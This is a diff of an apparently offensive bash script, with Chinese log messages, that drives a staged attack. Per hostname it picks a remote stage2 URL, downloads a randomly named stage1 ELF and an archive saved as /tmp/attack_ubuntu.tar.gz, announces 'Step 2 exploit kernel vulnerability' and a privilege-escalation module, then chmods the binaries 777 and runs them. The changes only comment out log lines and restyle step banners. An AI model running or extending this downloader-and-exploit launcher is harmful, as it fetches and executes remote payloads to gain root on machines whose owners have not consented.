@@ -53,9 +53,9 @@ fi
 # 正常流程 - 获取 stage2 URL
 STAGE2_URL="${STAGE2_URL_MAP[$HOST_NAME]:-$DEFAULT_STAGE2}"
 if [ "$STAGE2_URL" = "$DEFAULT_STAGE2" ] && [ -z "${STAGE2_URL_MAP[$HOST_NAME]+isset}" ]; then
-    log_warn "未知主机名 '$HOST_NAME'，使用默认 stage2: $DEFAULT_STAGE2"
+    # log_warn "未知主机名 '$HOST_NAME'，使用默认 stage2: $DEFAULT_STAGE2"
 else
-    log_info "检测到主机: $HOST_NAME → stage2: $STAGE2_URL"
+    # log_info "检测到主机: $HOST_NAME → stage2: $STAGE2_URL"
 fi
 
 # ==================== Stage1 URL（固定） ====================
@@ -89,8 +89,7 @@ download_file() {
 # ==================== 主流程 ====================
 attempt=1
 while [ $attempt -le $MAX_RETRIES ]; do
-    log_info "====== 第 ${attempt}/${MAX_RETRIES} 次尝试 ======="
-    log_info "[Step 1] 远程连接"
+    log_info "========== Step 1 远程连接 =========="
 
     RAND_SUFFIX=$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')
     stage1_bin="s1_${RAND_SUFFIX}.elf"
@@ -143,7 +142,7 @@ while [ $attempt -le $MAX_RETRIES ]; do
         -O "/tmp/attack_ubuntu.tar.gz"
 
     log_info "[+] 下载阶段完成，继续后续操作...\n"
-    log_info "[Step 2] 利用内核漏洞"
+    log_info "========== Step 2 利用内核漏洞 =========="
     log_info "[*] 启动提权模块..."
 
     cmd="STAGE2_URL=\"$STAGE2_URL\" STAGE2_FILENAME=\"$stage2_bin\" HOST_IDENTIFIER=\"$HOST_NAME\" chmod 777 \"./$stage1_bin\" \"./$stage2_bin\" && script -q -c \"./$stage1_bin\" /tmp/stage1.log"
